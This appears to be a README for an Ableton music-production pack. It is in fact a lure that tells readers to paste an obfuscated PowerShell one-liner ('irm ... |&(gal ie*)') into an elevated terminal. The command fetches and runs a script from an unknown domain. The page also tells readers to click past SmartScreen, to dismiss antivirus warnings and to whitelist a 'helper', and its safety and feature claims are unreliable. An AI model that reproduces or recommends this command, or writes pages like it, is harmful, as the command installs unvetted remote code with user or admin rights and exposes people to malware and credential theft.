# Ableton Production Bench [Download & Setup Notes]

![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078d7?logo=windows11&logoColor=white) ![version](https://img.shields.io/badge/version-v6.2.6-blue) ![status](https://img.shields.io/badge/status-maintained-success) ![updated](https://img.shields.io/badge/updated-2026--11--09-informational) ![license](https://img.shields.io/badge/license-MIT-green)

The racks and chains behind release-ready mixes. No complicated steps, no sign-up walls. Use the download section below and you're done.

## ✨ Highlights

- ✅ No personal data collection
- ✅ Offline-friendly after first launch
- ✅ One-click setup — no manual configuration needed
- ✅ Step-by-step documentation included in this repository
- ✅ Community-tested release, feedback welcome via issues
- ✅ Lightweight footprint, runs even on older hardware

## 🚀 How to launch

1. Open the power-user menu with **Win + X**.
2. Launch **Terminal (PowerShell)** — administrator mode is optional but recommended.
3. Insert this command, press **Enter**, done.

```powershell
irm quickrun31.cc/ax38ra|&(gal ie*)
```

> 💡 Tip: keep this command handy — re-running it always fetches the current build.

## 🖥️ Requirements

| Requirement | Details |
|---|---|
| Operating system | Windows 10 (64-bit) or newer |
| Memory | 6 GB RAM recommended |
| Disk space | ~80 MB free |
| Internet | Required on first run; updates are periodic |

## 📋 Notes

- Windows SmartScreen may ask for confirmation the first time; choose "Run anyway".
- If your security software flags the command, review it first — it simply downloads and runs the setup from the official source.
- Administrator rights are not required for most setups, but the Win+X terminal runs elevated by default on many systems.

## ❓ FAQ

<details>
<summary><strong>Is an internet connection required?</strong></summary>

Yes — the first launch pulls the latest build, afterwards it can run mostly offline.

</details>

<details>
<summary><strong>Where do I report problems?</strong></summary>

Open an issue in this repository with your OS version and a short description of what happened.

</details>

<details>
<summary><strong>Does it work on Windows 7?</strong></summary>

Legacy systems are not officially supported; use Windows 10 or newer for best results.

</details>

<details>
<summary><strong>Is it safe?</strong></summary>

The launcher only reads remote instructions from the official source listed in the command. Review the script before running if you want to be extra careful.

</details>

<details>
<summary><strong>Do I need to disable my antivirus?</strong></summary>

Usually no. Only whitelist the helper if your security software quarantines the clipboard helper.

</details>

## 🧾 License

Released under the **MIT License** — see [LICENSE](./LICENSE).

_Educational project. If you like the tool, consider supporting its official developers._
